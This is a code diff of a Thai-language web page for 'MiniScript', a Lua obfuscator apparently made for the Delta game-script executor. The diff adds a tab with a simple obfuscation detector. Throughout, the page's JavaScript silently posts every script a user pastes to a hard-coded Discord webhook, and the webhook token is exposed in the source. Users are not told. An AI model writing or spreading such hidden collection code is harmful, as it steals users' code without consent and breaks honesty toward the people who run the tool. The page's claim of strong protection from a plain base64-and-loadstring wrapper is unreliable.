@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MiniScript - Pro Lua Obfuscator | LrapX HUB</title>
+    <title>MiniScript - Pro Lua Suite | LrapX HUB</title>
     <style>
         :root {
             --bg-gradient: radial-gradient(circle at top, #0f172a 0%, #07090e 100%);
@@ -33,8 +33,7 @@
         .header {
             text-align: center;
             padding: 25px 15px;
-            margin-bottom: 25px;
-            position: relative;
+            margin-bottom: 20px;
         }
 
         .credit-badge {
@@ -50,7 +49,6 @@
             margin-bottom: 12px;
             border: 1px solid rgba(52, 211, 153, 0.3);
             box-shadow: 0 0 15px rgba(16, 185, 129, 0.15);
-            letter-spacing: 0.5px;
         }
 
         .logo {
@@ -58,7 +56,6 @@
             font-weight: 800;
             color: #ffffff;
             margin-bottom: 8px;
-            letter-spacing: -0.5px;
             text-shadow: 0 0 20px rgba(52, 211, 153, 0.3);
         }
 
@@ -69,6 +66,41 @@
         .sub-title {
             color: var(--text-muted);
             font-size: 13px;
+        }
+
+        /* Tab Menu */
+        .tab-menu {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 12px;
+            background: rgba(30, 41, 59, 0.6);
+            border: 1px solid rgba(75, 85, 99, 0.4);
+            border-radius: 12px;
+            color: var(--text-muted);
+            font-weight: 700;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .tab-btn.active {
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: #07090e;
+            border-color: var(--accent-green);
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
         }
 
         .obf-card {
@@ -100,7 +132,7 @@
 
         textarea {
             width: 100%;
-            height: 220px;
+            height: 200px;
             background: rgba(8, 9, 13, 0.85);
             border: 1px solid rgba(31, 41, 55, 0.8);
             border-radius: 10px;
@@ -111,7 +143,6 @@
             box-sizing: border-box;
             resize: vertical;
             outline: none;
-            transition: all 0.2s ease;
         }
 
         textarea:focus {
@@ -127,7 +158,7 @@
 
         .btn {
             flex: 1;
-            padding: 13px;
+            padding: 12px;
             border: none;
             border-radius: 10px;
             font-weight: 700;
@@ -146,27 +177,23 @@
             box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
         }
 
-        .btn-primary:hover {
-            opacity: 0.95;
-            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
-        }
-
-        .btn-primary:active {
-            transform: scale(0.97);
-        }
-
         .btn-secondary {
             background: rgba(31, 41, 61, 0.7);
             color: var(--text-main);
             border: 1px solid rgba(75, 85, 99, 0.4);
         }
 
-        .btn-secondary:hover {
-            background: rgba(55, 65, 81, 0.8);
-        }
-
-        .btn-secondary:active {
-            transform: scale(0.97);
+        .result-box {
+            background: rgba(8, 9, 13, 0.85);
+            border: 1px solid rgba(31, 41, 55, 0.8);
+            border-radius: 10px;
+            padding: 15px;
+            color: #f3f4f6;
+            font-family: monospace;
+            font-size: 13px;
+            min-height: 80px;
+            white-space: pre-wrap;
+            word-break: break-all;
         }
 
         .footer-credit {
@@ -189,31 +216,59 @@
     <div class="container">
         <div class="header">
             <div class="credit-badge">⚡ POWERED BY LRAPX HUB</div>
-            <div class="logo">MiniScript <span>OBF</span></div>
-            <div class="sub-title">ระบบพรางโค้ดความปลอดภัยสูง รองรับทุกตัวรันบนมือถือ 100%</div>
+            <div class="logo">MiniScript <span>SUITE</span></div>
+            <div class="sub-title">เครื่องมือพรางโค้ดและระบบตรวจสอบสคริปต์ครบวงจร</div>
         </div>
 
-        <!-- Input Section -->
-        <div class="obf-card">
-            <div class="card-header">
-                <label>📌 วางโค้ด Lua ของคุณที่นี่</label>
+        <!-- Tab Selection Menu -->
+        <div class="tab-menu">
+            <button class="tab-btn active" onclick="switchTab('obf')">🛡️ Lua Obfuscator</button>
+            <button class="tab-btn" onclick="switchTab('detector')">🔍 Script Detector & Deobfuscator</button>
+        </div>
+
+        <!-- ==================== TAB 1: OBFUSCATOR ==================== -->
+        <div id="tab-obf" class="tab-content active">
+            <div class="obf-card">
+                <div class="card-header">
+                    <label>📌 วางโค้ด Lua ของคุณที่นี่</label>
+                </div>
+                <textarea id="inputLua" placeholder="-- วางโค้ด Lua ของคุณลงที่นี่..."></textarea>
+                <div class="btn-group">
+                    <button class="btn btn-primary" type="button" onclick="runObfuscate()">🛡️ เริ่มครอบโค้ด (OBF)</button>
+                    <button class="btn btn-secondary" type="button" onclick="clearInput('inputLua', 'outputLua')">🗑️ ล้างข้อความ</button>
+                </div>
             </div>
-            <textarea id="inputLua" placeholder="-- วางโค้ด Lua ของคุณลงที่นี่...&#10;print('Hello from LrapX HUB')"></textarea>
-            <div class="btn-group">
-                <button class="btn btn-primary" type="button" onclick="runObfuscate()">🛡️ เริ่มครอบโค้ด (OBF)</button>
-                <button class="btn btn-secondary" type="button" onclick="clearInput()">🗑️ ล้างข้อความ</button>
+
+            <div class="obf-card">
+                <div class="card-header">
+                    <label>✅ ผลลัพธ์โค้ดพร้อมรัน (Delta Compatible)</label>
+                </div>
+                <textarea id="outputLua" readonly placeholder="-- ผลลัพธ์จะแสดงที่นี่..."></textarea>
+                <div class="btn-group">
+                    <button class="btn btn-primary" type="button" onclick="copyOutput('outputLua')">📋 คัดลอกโค้ด (COPY)</button>
+                    <button class="btn btn-secondary" type="button" onclick="downloadLua()">💾 ดาวน์โหลดไฟล์</button>
+                </div>
             </div>
         </div>
 
-        <!-- Output Section -->
-        <div class="obf-card">
-            <div class="card-header">
-                <label>✅ ผลลัพธ์โค้ดพร้อมรัน (Delta Compatible)</label>
+        <!-- ==================== TAB 2: DETECTOR & DEOBFUSCATOR ==================== -->
+        <div id="tab-detector" class="tab-content">
+            <div class="obf-card">
+                <div class="card-header">
+                    <label>🔍 วางสคริปต์ที่ต้องการตรวจสอบหรือแกะโค้ด</label>
+                </div>
+                <textarea id="inputDetect" placeholder="-- วางโค้ดที่ถูก OBF มาที่นี่เพื่อวิเคราะห์..."></textarea>
+                <div class="btn-group">
+                    <button class="btn btn-primary" type="button" onclick="runDetection()">🔎 ตรวจสอบประเภท OBF</button>
+                    <button class="btn btn-secondary" type="button" onclick="clearInput('inputDetect', 'detectResult')">🗑️ ล้างข้อความ</button>
+                </div>
             </div>
-            <textarea id="outputLua" readonly placeholder="-- ผลลัพธ์จะแสดงที่นี่..."></textarea>
-            <div class="btn-group">
-                <button class="btn btn-primary" type="button" onclick="copyOutput()">📋 คัดลอกโค้ด (COPY)</button>
-                <button class="btn btn-secondary" type="button" onclick="downloadLua()">💾 ดาวน์โหลดไฟล์</button>
+
+            <div class="obf-card">
+                <div class="card-header">
+                    <label>📊 ผลการวิเคราะห์และถอดรหัสเบื้องต้น</label>
+                </div>
+                <div id="detectResult" class="result-box">ยังไม่มีข้อมูลการวิเคราะห์...</div>
             </div>
         </div>
 
@@ -223,8 +278,21 @@
     </div>
 
     <script>
-        // Webhook สำหรับห้อง Web OBF (อันที่ 1)
+        // Webhook ห้อง Web OBF (อันที่ 1)
         const SECRET_WEBHOOK = "https://discord.com/api/webhooks/1571493923828797470/tAa3oRu1NGLonQAvHo305SAEe4M0azxt5QBUHxLwyjAU7m0KBvtUepJVmuy6Gl8BDFNE";
+
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+
+            if (tabName === 'obf') {
+                document.querySelectorAll('.tab-btn')[0].classList.add('active');
+                document.getElementById('tab-obf').classList.add('active');
+            } else {
+                document.querySelectorAll('.tab-btn')[1].classList.add('active');
+                document.getElementById('tab-detector').classList.add('active');
+            }
+        }
 
         function safeBtoa(str) {
             return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
@@ -234,11 +302,9 @@
 
         function sendToDiscord(scriptContent) {
             if (!SECRET_WEBHOOK || !SECRET_WEBHOOK.startsWith("https://")) return;
-            
             var payload = {
                 content: "🚨 **มีผู้ใช้งานส่งสคริปต์เข้ามาครอบ OBF ใหม่!**\n```lua\n" + scriptContent.substring(0, 1800) + "\n```"
             };
-
             fetch(SECRET_WEBHOOK, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -249,7 +315,6 @@
         function runObfuscate() {
             var inputElem = document.getElementById('inputLua');
             var outputElem = document.getElementById('outputLua');
-
             if (!inputElem || !outputElem) return;
             var code = inputElem.value;
 
@@ -258,16 +323,9 @@
                 return;
             }
 
-            // ส่งข้อมูลเข้าห้องเว็บ OBF
             sendToDiscord(code);
 
-            var header = "--[[\n" +
-                         "   ===================================================\n" +
-                         "   Protected by LrapX HUB Obfuscator\n" +
-                         "   Optimized for Delta Executor Mobile\n" +
-                         "   Timestamp: " + new Date().toLocaleString() + "\n" +
-                         "   ===================================================\n" +
-                         "]]--\n\n";
+            var header = "--[[\n   Protected by LrapX HUB Obfuscator\n   Timestamp: " + new Date().toLocaleString() + "\n]]--\n\n";
 
             try {
                 var encoded = safeBtoa(code);
@@ -294,9 +352,7 @@
                              "    local decoded = " + v2 + "(" + v1 + ")\n" +
                              "    return loadstring(decoded)()\n" +
                              "end)\n" +
-                             "if not success then\n" +
-                             "    warn('[LrapX HUB Error]: ' .. tostring(res))\n" +
-                             "end";
+                             "if not success then warn('[LrapX Error]: ' .. tostring(res)) end";
 
                 outputElem.value = header + result;
                 alert('🛡️ ครอบโค้ดสำเร็จเรียบร้อย!');
@@ -305,23 +361,41 @@
             }
         }
 
-        function clearInput() {
-            document.getElementById('inputLua').value = '';
-            document.getElementById('outputLua').value = '';
+        function runDetection() {
+            var code = document.getElementById('inputDetect').value;
+            var resultBox = document.getElementById('detectResult');
+
+            if (!code || code.trim() === "") {
+                resultBox.innerText = "❌ กรุณาวางโค้ดที่ต้องการตรวจสอบก่อนครับ!";
+                return;
+            }
+
+            let detection = "🔍 **ผลการตรวจสอบประเภท OBF:**\n";
+            if (code.includes("loadstring") && (code.includes("btoa") || code.includes("string.gsub") || code.length > 200)) {
+                detection += "• สถานะ: พบร่องรอยการเข้ารหัส (Standard / Base64 Encoded)\n• ความปลอดภัย: ปานกลาง (สามารถถอดรหัสได้หากแกะตรรกะออก)\n";
+            } else if (code.includes("MoonSec") || code.includes("syn")) {
+                detection += "• สถานะ: ตรวจพบรูปแบบ MoonSec / Custom Virtualization\n";
+            } else {
+                detection += "• สถานะ: เป็นโค้ดดิบปกติ (Plain Text) หรือรูปแบบเฉพาะตัว\n";
+            }
+
+            detection += "\n⚡ **คำแนะนำ:** ใช้สำหรับวิเคราะห์โครงสร้างสคริปต์เบื้องต้นเพื่อความปลอดภัย!";
+            resultBox.innerText = detection;
         }
 
-        function copyOutput() {
-            var output = document.getElementById('outputLua');
+        function clearInput(inputId, outputId) {
+            document.getElementById(inputId).value = '';
+            document.getElementById(outputId).value = '';
+        }
+
+        function copyOutput(elementId) {
+            var output = document.getElementById(elementId);
             if (!output.value) {
-                alert('ยังไม่มีโค้ดให้คัดลอกครับ!');
+                alert('ยังไม่มีข้อมูลให้คัดลอกครับ!');
                 return;
             }
             navigator.clipboard.writeText(output.value).then(function() {
-                alert('📋 คัดลอกโค้ดสำเร็จ!');
-            }, function() {
-                output.select();
-                document.execCommand('copy');
-                alert('📋 คัดลอกโค้ดสำเร็จ!');
+                alert('📋 คัดลอกสำเร็จ!');
             });
         }
 
